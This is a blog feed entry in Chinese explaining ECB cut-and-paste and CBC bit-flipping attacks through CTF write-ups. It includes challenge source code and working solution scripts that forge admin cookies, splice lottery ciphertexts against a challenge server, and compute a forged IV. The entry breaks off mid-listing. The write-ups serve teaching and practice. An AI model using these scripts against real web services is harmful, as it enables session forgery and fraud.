<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>ye1s</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://blog.cfyqy.com/"/>
  <updated>2021-02-24T09:56:19.099Z</updated>
  <id>https://blog.cfyqy.com/</id>
  
  <author>
    <name>ye1s</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>常见的-WEB-密码学攻击</title>
    <link href="https://blog.cfyqy.com/article/10fa8c14.html"/>
    <id>https://blog.cfyqy.com/article/10fa8c14.html</id>
    <published>2021-02-19T16:15:53.000Z</published>
    <updated>2021-02-24T09:56:19.099Z</updated>
    
    <content type="html"><![CDATA[<p>常见的 WEB 密码学攻击</p><a id="more"></a><h1 id="ECB"><a href="#ECB" class="headerlink" title="ECB"></a>ECB</h1><p>ECB模式的全称是Electronic CodeBook模式，将明文分组加密后直接成为密文分组，而密文则是由密文分组直接拼接而成。 </p><p>因为每个分组都独自进行加密解密，所以无需破解密文就能操纵部分明文，或者改变明文，在不知道加密算法的情况下得到密文，从而达到攻击效果，如图所示（翻转密文分组，那么明文分组也会被翻转）</p><p><strong>例题1：</strong><br>某个 CTF 题目：</p><p> ecb.php 源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//php7</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">AES</span><span class="params">($data)</span></span>&#123;</span><br><span class="line">    $privateKey = <span class="string">"12345678123456781234567812345678"</span>;</span><br><span class="line">    $encrypted=openssl_encrypt($data,<span class="string">'AES-128-ECB'</span>,$privateKey,OPENSSL_RAW_DATA);</span><br><span class="line">    <span class="comment">#$encrypted = mcrypt_encrypt(MCRYPT_RIJNDAEL_128, $privateKey, $data, MCRYPT_MODE_ECB);</span></span><br><span class="line">    $encryptedData = (base64_encode($encrypted));</span><br><span class="line">    <span class="keyword">return</span> $encryptedData;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">DE__AES</span><span class="params">($data)</span></span>&#123;</span><br><span class="line">    $privateKey = <span class="string">"12345678123456781234567812345678"</span>;</span><br><span class="line">    $encryptedData = base64_decode($data);</span><br><span class="line">   $decrypted=openssl_decrypt($encryptedData,<span class="string">'AES-128-ECB'</span>,$privateKey,OPENSSL_RAW_DATA);</span><br><span class="line">    $decrypted = rtrim($decrypted, <span class="string">""</span>) ;</span><br><span class="line">    <span class="keyword">return</span> $decrypted;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (@$_GET[<span class="string">'a'</span>]==<span class="string">'reg'</span>)&#123;</span><br><span class="line">    setcookie(<span class="string">'uid'</span>, AES(<span class="string">'9'</span>));</span><br><span class="line">    setcookie(<span class="string">'username'</span>, AES($_POST[<span class="string">'username'</span>]));</span><br><span class="line">    header(<span class="string">"Location: http://127.0.0.1/ecb.php"</span>);</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (@!<span class="keyword">isset</span>($_COOKIE[<span class="string">'uid'</span>])||@!<span class="keyword">isset</span>($_COOKIE[<span class="string">'username'</span>]))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'&lt;form method="post" action="ecb.php?a=reg"&gt;</span></span><br><span class="line"><span class="string">Username:&lt;br&gt;</span></span><br><span class="line"><span class="string">&lt;input type="text"  name="username"&gt;</span></span><br><span class="line"><span class="string">&lt;br&gt;</span></span><br><span class="line"><span class="string">Password:&lt;br&gt;</span></span><br><span class="line"><span class="string">&lt;input type="text" name="password" &gt;</span></span><br><span class="line"><span class="string">&lt;br&gt;&lt;br&gt;</span></span><br><span class="line"><span class="string">&lt;input type="submit" value="注册"&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt; '</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    $uid = DE__AES($_COOKIE[<span class="string">'uid'</span>]);</span><br><span class="line">    <span class="keyword">if</span> ( $uid != <span class="number">4</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'uid:'</span> .$uid .<span class="string">'&lt;br/&gt;'</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'Hi '</span> . DE__AES($_COOKIE[<span class="string">'username'</span>]) .<span class="string">'&lt;br/&gt;'</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'You are not administrotor!!'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">          <span class="keyword">echo</span> <span class="string">"Hi you are administrotor!!"</span> .<span class="string">'&lt;br/&gt;'</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'Flag is flag&#123;this is flag&#125;'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>解题思路：<br>以administrator权限登陆就就能获得Flag。判断权限则是根据cookie里面的uid参数，cookie包含username和uid两个参数，均为使用ECB加密的密文，然而username的密文是根据注册时的明文生成的</p><p>因此我们可以根据username的明文操纵生成我们想要的uid的密文。经过fuzz发现明文分组块为16个字节，那么我们注册17字节的用户，多出的那一个字节就可以是我们我们希望的UID的值，而此时我们查看username的密文增加部分就是UID的密文，即可伪造UID。</p><p>注册aaaaaaaaaaaaaaaa1获得1的密文分组,注册aaaaaaaaaaaaaaaa2获得2的密文分组，以此类推<br>payload</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">//python2</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> urllib2</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> cookielib</span><br><span class="line"><span class="keyword">import</span> Cookie</span><br><span class="line"><span class="keyword">for</span> num <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">    reg_url=<span class="string">'http://127.0.0.1/ecb.php?a=reg'</span></span><br><span class="line">    index_url=<span class="string">'http://127.0.0.1/ecb.php'</span></span><br><span class="line">    cookie=cookielib.CookieJar()</span><br><span class="line">    opener=urllib2.build_opener(urllib2.HTTPCookieProcessor(cookie))</span><br><span class="line">    opener.addheaders.append((<span class="string">'User-Agent'</span>,<span class="string">'Mozilla/5.0'</span>))</span><br><span class="line">    num=str(num)</span><br><span class="line">    values=&#123;<span class="string">'username'</span>:<span class="string">'aaaaaaaaaaaaaaaa'</span>+num,<span class="string">'password'</span>:<span class="string">'123'</span>&#125;</span><br><span class="line">    data=urllib.urlencode(values)</span><br><span class="line">    opener.open(reg_url,data)</span><br><span class="line">    text=opener.open(index_url,data)</span><br><span class="line">    <span class="keyword">for</span> ck <span class="keyword">in</span> cookie:</span><br><span class="line">        <span class="keyword">if</span> ck.name==<span class="string">'username'</span>:</span><br><span class="line">            user_name=ck.value</span><br><span class="line">    user_name = urllib.unquote(user_name)</span><br><span class="line">    user_name = base64.b64decode(user_name)</span><br><span class="line">    hex_name = user_name.encode(<span class="string">'hex'</span>)</span><br><span class="line">    hex_name = hex_name[len(hex_name)/<span class="number">2</span>:]</span><br><span class="line">    hex_name = hex_name.decode(<span class="string">'hex'</span>)</span><br><span class="line">    uid = base64.b64encode(hex_name)</span><br><span class="line">    uid = urllib.quote(uid)</span><br><span class="line">    <span class="keyword">for</span> ck <span class="keyword">in</span> cookie:</span><br><span class="line">        <span class="keyword">if</span> ck.name==<span class="string">'uid'</span>:</span><br><span class="line">            ck.value=uid</span><br><span class="line">    text=opener.open(index_url).read()</span><br><span class="line">    <span class="keyword">if</span> <span class="string">'Flag'</span> <span class="keyword">in</span> text:</span><br><span class="line">        <span class="keyword">print</span> text</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">       <span class="keyword">print</span> num</span><br></pre></td></tr></table></figure><p><strong>例题2：</strong><br>startCTF 2021 lottery again<br>ecb模式，按块加密，每块密钥相同，密文按块直接与明文对应，所以我们可以控制明密文对重放攻击。</p><p>对于一个enc，长106字节，如下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">"lottery"</span>:<span class="string">"48e51545-cfd3-4d2e-8ea4-851c945b5faf"</span>,<span class="string">"user"</span>:<span class="string">"0123ff93-c230-49b9-b078-5d205247c5a8"</span>,<span class="string">"coin"</span>:81&#125;</span><br></pre></td></tr></table></figure><p>本题使用的是MCRYPT_RIJNDAEL_256加密，rijndael128与aes相同，都是以128位为一个块加密，rijndael256则是以256位为一个块，即32字节。</p><p>思路就是通过重放，将多个彩票不同块进行拼接，使得同一个user可以对应多个lottery。</p><p>因为每块是32字节对应切割位点如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">"lottery"</span>:<span class="string">"48e51545-cfd3-4d2e-8|ea4-851c945b5faf"</span>,<span class="string">"user"</span>:<span class="string">"0123ff|93-c230-49b9-b078-5d205247c5a8"</span>,|<span class="string">"coin"</span>:81&#125;</span><br></pre></td></tr></table></figure><p>最后一块不足32字节自动填充。</p><p>可以看到我们无论替换哪一个块都不能完整控制lottery或者user，替换前两块的成功的前提是另一个enc的user前6字节也是0123ff，碰撞概率较小。</p><p>但是我们可以将第一个enc的前1，2块拼接上第二个enc的2，3，4块，形成如下类似的格式</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">"lottery"</span>:<span class="string">"48e51545-cfd3-4d2e-8ea4-851c945b5faf"</span>,<span class="string">"user"</span>:<span class="string">"0123ffb0e-b15c9de5afaa"</span>,<span class="string">"user"</span>:<span class="string">"8dfd276a-ee65-4563-af33-c1ae7c577322"</span>,<span class="string">"coin"</span>:88&#125;</span><br></pre></td></tr></table></figure><p>当json_decode之后后面的user会覆盖前面的，就成功控制user不变，lottery一直在变了。</p><p>脚本如下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import random</span><br><span class="line">import string</span><br><span class="line">import json</span><br><span class="line">import base64</span><br><span class="line">from urllib.parse import quote</span><br><span class="line">user_token = <span class="string">"1slT9Xb1TxoDtEtxKZ2k0n8c9T3lZttY"</span></span><br><span class="line">user_uuid = <span class="string">"fadf5f40-9fe1-4a57-8d5b-06f16584298b"</span></span><br><span class="line">user_enc = b<span class="string">"8mKK4YdL0VHw67+rtMCBv+z9SX4yB7SwYWlL2A3VPqXXFHIpf1XGIVDHNxW5td/3fyYbEEEBv43419eYjQAwd9thL1nc+6OWy2UDfXdG+INLgbXDkV8kaRNGurSbXtf5XUzAgdeXmksz508IscL5BqiGkpqPuH/4Qa5qAiM0/hU="</span></span><br><span class="line">cookie = &#123;</span><br><span class="line">    <span class="string">"api_token"</span>: user_token</span><br><span class="line">&#125;</span><br><span class="line">url = <span class="string">"http://52.149.144.45:8080"</span></span><br><span class="line">def get_random():</span><br><span class="line">    <span class="built_in">return</span> <span class="string">''</span>.join(random.sample(string.ascii_letters + string.digits, 10))</span><br><span class="line">def register():</span><br><span class="line">    username=get_random()</span><br><span class="line">    data= &#123;</span><br><span class="line">            <span class="string">"username"</span>: username,</span><br><span class="line">            <span class="string">"password"</span>: <span class="string">"asdasd"</span></span><br><span class="line">    &#125;</span><br><span class="line">    res = requests.post(url + <span class="string">"/user/register"</span>,data=data)</span><br><span class="line">    d = json.loads(res.text)</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">return</span> username</span><br><span class="line">def login(username, password=<span class="string">"asdasd"</span>):</span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">"username"</span>: username,</span><br><span class="line">        <span class="string">"password"</span>: password</span><br><span class="line">    &#125;</span><br><span class="line">    res = requests.post(url + <span class="string">"/user/login"</span>,data=data)</span><br><span class="line">    d = json.loads(res.text)</span><br><span class="line">    <span class="built_in">return</span> d[<span class="string">'user'</span>][<span class="string">'api_token'</span>]</span><br><span class="line">def info(api_token):</span><br><span class="line">    res = requests.get(url + <span class="string">"/user/info?api_token="</span> + api_token)</span><br><span class="line">    d = json.loads(res.text)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">'uuid: '</span>+d[<span class="string">'user'</span>][<span class="string">'uuid'</span>])</span><br><span class="line">def buy(api_key):</span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">"api_token"</span>: api_key</span><br><span class="line">    &#125;</span><br><span class="line">    res = requests.post(url + <span class="string">"/lottery/buy"</span>,data=data)</span><br><span class="line">    <span class="comment">#print(res.text)</span></span><br><span class="line">    d = json.loads(res.text)</span><br><span class="line">    <span class="built_in">return</span> d[<span class="string">'enc'</span>]</span><br><span class="line">def get_enc(enc):</span><br><span class="line">    o = base64.b64decode(enc)</span><br><span class="line">    u = base64.b64decode(user_enc)</span><br><span class="line">    m = base64.b64encode(o[:64] + u[32:])</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">'enc: '</span>, end=<span class="string">''</span>)</span><br><span class="line">    <span class="built_in">print</span>(quote(m))</span><br><span class="line">    <span class="built_in">return</span> m</span><br><span class="line">def charge(enc):</span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">"user"</span>: user_uuid,</span><br><span class="line">        <span class="string">"enc"</span>: enc,</span><br><span class="line">        <span class="string">"coin"</span>: <span class="string">"7"</span></span><br><span class="line">    &#125;</span><br><span class="line">    res = requests.post(url + <span class="string">"/lottery/charge"</span>, data=data, cookies=cookie)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">"charge: "</span>, end=<span class="string">''</span>)</span><br><span class="line">    <span class="built_in">print</span>(res.content)</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    <span class="keyword">while</span> True:</span><br><span class="line">        username = register()</span><br><span class="line">        api_token = login(username)</span><br><span class="line">        enc = buy(api_token)</span><br><span class="line">        info(api_token)</span><br><span class="line">        mo_enc = get_enc(enc)</span><br><span class="line">        charge(mo_enc)</span><br></pre></td></tr></table></figure><h1 id="CBC"><a href="#CBC" class="headerlink" title="CBC"></a>CBC</h1><h2 id="字节翻转"><a href="#字节翻转" class="headerlink" title="字节翻转"></a>字节翻转</h2><p>因为CBC模式是将前一个密文分组和明文分组进行混合加密所以，是可以避免ECB模式的弱点。</p><p>但正因为如此，导致了解密时修改前一个密文分组就可以操纵后一个的解密后的明文分组，可以将前一个密文中的任意比特进行修改（0,1进行互换，也可以叫翻转）</p><p>因此CBC模式有两个攻击点：  </p><ul><li>①iv向量，影响第一个明文分组   </li><li>②第n个密文分组，影响第n+1个明文分组   </li></ul><p>密文通过block cipher encryption解密，得到中间密文，中间密文与IV(前一个密文区块)异或后得到的是明文，因此可以通过攻击IV，来改变最终的明文。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">条件：中间密文 ^ 原先IV = 原始明文</span><br><span class="line"></span><br><span class="line">假设：伪造IV = 原始IV ^ 原始明文 ^ 伪造明文</span><br><span class="line"></span><br><span class="line">此时： 中间密文 ^ 伪造IV=原始IV ^ 原始明文 ^ 伪造IV =原始IV ^ 原始明文^原始IV ^ 原始明文 ^ 伪造明文=伪造明文</span><br><span class="line"></span><br><span class="line">所以：中间密文 ^ 伪造IV = 伪造明文</span><br><span class="line">通过篡改IV，来改变密文解密之后的明文</span><br><span class="line"></span><br><span class="line">举例：</span><br><span class="line">密文1[4]的意思是密文1字符串第4个字节，相当于数组下标。</span><br><span class="line">设：密文1[4] = A，解密(密文2)[4] = B，明文2[4] = C</span><br><span class="line">因为A ^ B = C，根据结论有B = A ^ C</span><br><span class="line">当人为修改A=A ^ C时，那么A ^ B = A ^ C ^ B = B ^ B = 0，这样明文2[4]的结果就为0了</span><br><span class="line">当人为修改A=A ^ C ^ x (x为任意数值)时，那么</span><br><span class="line">A ^ B = A ^ C ^ x ^ B = B ^ B ^ x = x，这是明文2[4] = x，这样就达到了控制明文某个字节的目的了。</span><br></pre></td></tr></table></figure><p><strong>例题1：</strong><br>flag.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// flag.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$key = <span class="string">"8bd54bcfe6a23fc0"</span>;</span><br><span class="line">$flag = <span class="string">"flag&#123;admin_or_guest&#125;"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>cbc.php   </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">"flag.php"</span>);</span><br><span class="line"></span><br><span class="line">$iv = <span class="string">'NGY0MWVlOGE2MGU4NTkxMQ=='</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">decode</span><span class="params">($str,$key,$iv)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> openssl_decrypt(base64_decode($str),<span class="string">"AES-128-CBC"</span>,$key,OPENSSL_RAW_DATA,base64_decode($iv));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">encode</span><span class="params">($str,$key,$iv)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> base64_encode(openssl_encrypt($str,<span class="string">"AES-128-CBC"</span>,$key,OPENSSL_RAW_DATA, base64_decode($iv)));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_COOKIE[<span class="string">'username'</span>]) &amp;&amp; <span class="keyword">isset</span>($_COOKIE[<span class="string">'iv'</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(decode($_COOKIE[<span class="string">'username'</span>],$key,$_COOKIE[<span class="string">'iv'</span>]) === <span class="string">"admin"</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"hello admin&lt;br&gt;"</span>;</span><br><span class="line">        <span class="keyword">echo</span> $flag.<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(decode($_COOKIE[<span class="string">'username'</span>],$key,$_COOKIE[<span class="string">'iv'</span>]) === <span class="string">"guest"</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"hello guest&lt;br&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"iv or username error"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    $enc = encode(<span class="string">"guest"</span>,$key,$iv);</span><br><span class="line">    setcookie(<span class="string">'username'</span>,$enc);</span><br><span class="line">    setcookie(<span class="string">'iv'</span>,$iv);</span><br><span class="line">&#125;</span><br><span class="line">highlight_file(<span class="keyword">__file__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>可以知道代码解密得到的用户名为 admin 时，会得到flag。</p><p>所以可以利用CBC字节翻转攻击，将密文解密成任意明文。 </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">iv = base64.b64decode(<span class="string">'NGY0MWVlOGE2MGU4NTkxMQ=='</span>)</span><br><span class="line">admin = <span class="string">'admin'</span> + <span class="string">'\x0b'</span>*<span class="number">11</span></span><br><span class="line">guest = <span class="string">'guest'</span> + <span class="string">'\x0b'</span>*<span class="number">11</span></span><br><span class="line">new_iv = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(admin)):</span><br><span class="line">    new_iv += chr(ord(iv[i]) ^ ord(admin[i]) ^ ord(guest[i]))</span><br><span class="line"><span class="keyword">print</span> base64.b64encode(new_iv)</span><br><span class="line"><span class="comment"># Mnc8K39lOGE2MGU4NTkxMQ==</span></span><br></pre></td></tr></table></figure><p><img src="../../images/cipher/web/1.jpg" alt=""></p><p><strong>例题2：</strong><br>Bugku 的 web39 CBC字节翻转攻击 </p><p>存在.index.php.swp ,vim -r .index.php.swp 恢复得源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html <span class="keyword">PUBLIC</span> <span class="string">"-//W3C//DTD XHTML 1.0 Transitional//EN"</span> <span class="string">"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"</span>&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv=<span class="string">"Content-Type"</span> content=<span class="string">"text/html; charset=utf-8"</span> /&gt;</span><br><span class="line">&lt;title&gt;Login Form&lt;/title&gt;</span><br><span class="line">&lt;link href=<span class="string">"static/css/style.css"</span> rel=<span class="string">"stylesheet"</span> type=<span class="string">"text/css"</span> /&gt;</span><br><span class="line">&lt;script type=<span class="string">"text/javascript"</span> src=<span class="string">"static/js/jquery.min.js"</span>&gt;&lt;/script&gt;</span><br><span class="line">&lt;script type=<span class="string">"text/javascript"</span>&gt;</span><br><span class="line">$(document).ready(<span class="function"><span class="keyword">function</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        $(<span class="string">".username"</span>).focus(<span class="function"><span class="keyword">function</span><span class="params">()</span> </span>&#123;</span><br><span class="line">                $(<span class="string">".user-icon"</span>).css(<span class="string">"left"</span>,<span class="string">"-48px"</span>);</span><br><span class="line">        &#125;);</span><br><span class="line">        $(<span class="string">".username"</span>).blur(<span class="function"><span class="keyword">function</span><span class="params">()</span> </span>&#123;</span><br><span class="line">                $(<span class="string">".user-icon"</span>).css(<span class="string">"left"</span>,<span class="string">"0px"</span>);</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        $(<span class="string">".password"</span>).focus(<span class="function"><span class="keyword">function</span><span class="params">()</span> </span>&#123;</span><br><span class="line">                $(<span class="string">".pass-icon"</span>).css(<span class="string">"left"</span>,<span class="string">"-48px"</span>);</span><br><span class="line">        &#125;);</span><br><span 